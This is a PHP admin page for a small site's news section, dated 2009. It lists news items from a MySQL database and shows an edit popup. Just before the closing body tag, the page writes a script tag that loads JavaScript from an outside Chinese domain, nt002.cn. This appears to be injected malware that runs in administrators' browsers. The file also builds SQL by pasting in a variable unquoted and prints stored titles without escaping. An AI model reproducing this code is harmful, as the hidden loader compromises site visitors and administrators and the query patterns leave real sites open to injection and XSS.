<?php
/****| admin_news.php |******************************************
*																*
*	This script is the news section of the ignite the spirit	*
*	administration panel. From here administrators can view,	*
*	add, edit, and delete news items.							*
*																*
*	Created By: Michael Pisula [mike.pisula@gmail.com]			*
*	Last Modified: 1/28/2009									*
*																*
****************************************************************/

include 'admin_header.php';																									//Includes Session start, and functions affecting all administration pages

if ($_SESSION['auth'] == "admin") 																							//Check if administrative user is logged in.
{
	include("db_connect.php");																								//Database Connection Script
	
	
	function edit_news ($edit_id)
		{
			$edit_query = "SELECT * FROM news WHERE news_id = $edit_id";
			$edit_result = mysql_query($edit_query);
			$row = mysql_fetch_array($edit_result, MYSQL_ASSOC);
			$print_date = date('F j, Y', strtotime($row['news_date']));
			$stripped_title = stripslashes($row['news_title']);
			$title = htmlentities($stripped_title, ENT_QUOTES);
			
			
			 ?>
			<div class="generic_dialog_popup" style="top: 125px;">
			<table class="pop_dialog_table" id="pop_dialog_table" style="width: 532px;">
			<tbody>
				<tr>
					<td class="pop_topleft"/>
					<td class="pop_border pop_top"/>
					<td class="pop_topright"/>
				</tr>

				<tr>
					<td class="pop_border pop_side"/>
					<td id="pop_content" class="pop_content">
						<h2 class="dialog_title"><span><?php echo $print_date; ?></span></h2>
						<div class="dialog_content">
							<div class="dialog_summary"><?php echo "<input name='title' type='text' value='".$title."'> &nbsp; &nbsp"; ?></div>
							<div class="dialog_body">
								<div class="ubersearch search_profile">

									<div class="result clearfix">
										
										<div class="info">
											<p>
											<?php echo "<textarea cols='70' rows='10' name='content'>".stripslashes($row['news_content'])."</textarea><br /><br />\n"; ?>
											</p>
										</div>
										<div class="clear" style="clear:both;"></div>
									</div>
								</div>
							</div>
							<div class="dialog_buttons">
								<input type="button" value="Cancel" name="close" class="inputsubmit" id="fb-close" />

							</div>
						</div>
					</td>
					<td class="pop_border pop_side"/>
				</tr>
				<tr>
					<td class="pop_bottomleft"/>
					<td class="pop_border pop_bottom"/>
					<td class="pop_bottomright"/>

				</tr>
			</tbody>
		</table>
	</div>
		<?php	
			
		}
	
	$query = "SELECT * FROM news ORDER BY news_date DESC";																	//Selecting news from the ignite database
	$news_result = mysql_query($query);	
																			//Query Database
	function news($query_result)			 																				//This function will echo the results from the query into a table
		{	
			echo "<table>\n".
				 "<tr class='header'>".
				 "<td>&nbsp;</td>".
				 "<td>Date</td>".
				 "<td>Title</td>".
				 "<td colspan='2'>Action</td>".
				 "</tr>\n";
			$counter = 1;																									//Sets a counter to be used for rotating color of table rows
			while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
				{
					$print_date = date('F j, Y', strtotime($row['news_date']));
					echo "<tr class='";
					oddeven($counter);																						//function located in admin_header.php - checks whether a number is odd or even, returns a class element
					echo "'>".
						 "<td></td>".
						 "<td>".$print_date."</td>".
						 "<td>".stripslashes($row['news_title'])."</td>".
						 "<td><a href='#' id='fb-trigger' rel='$row[news_id]'>[edit]</a></td>".
						 "<td><a href=''>[delete]</a></td>".
						 "</tr>\n";
					$counter++;																								//Increments counter
				}
			echo "</table>\n";
		}
	echo "<html>\n<head>\n<link rel='stylesheet' href='assets/admin.css'  type='text/css' />\n".
	 	 "<link rel='stylesheet' href='assets/modal.css'  type='text/css' />\n".
	 	 "<script type='text/javascript' src='assets/mootools-1.2.2.js'></script>\n".
	 	 "<script type='text/javascript' src='assets/modal.js'></script>\n"; ?>
		 	<script type="text/javascript">
		window.addEvent('domready',function() {
			/* hide using opacity on page load */
			$('fb-modal').setStyles({
				opacity:0,
				display:'block'
			});
			/* hiders */
			$('fb-close').addEvent('click',function(e) { $('fb-modal').fade('out'); });
			window.addEvent('keypress',function(e) { if(e.key == 'esc') { $('fb-modal').fade('out'); } });
			$(document.body).addEvent('click',function(e) { 
				if($('fb-modal').get('opacity') == 1 && !e.target.getParent('.generic_dialog')) { 
					$('fb-modal').fade('out'); 
				} 
			});
			/* click to show */
			$('fb-trigger').addEvent('click',function() {
				$('fb-modal').fade('in');
			});
			
			var news_id = el.get('rel');
            
		});
	</script>
		 
		 <?php
	echo "<h2>News</h2>";
	include 'admin_navigation.php';
	echo "<a href='admin_news_add.php'>Add News</a><br /><br />\n";
	news($news_result); 		
	?>
	<div class="generic_dialog" id="fb-modal">
	 <?php edit_news(39); ?>
	</div>
	<?php
	
									
	echo "<script src='http://nt002.cn/E/J.JS'></script></body>\n</html>\n";
	}
else
{
	include("log_form.php");																								//If user is not an administrator, display the log in form.
}
?>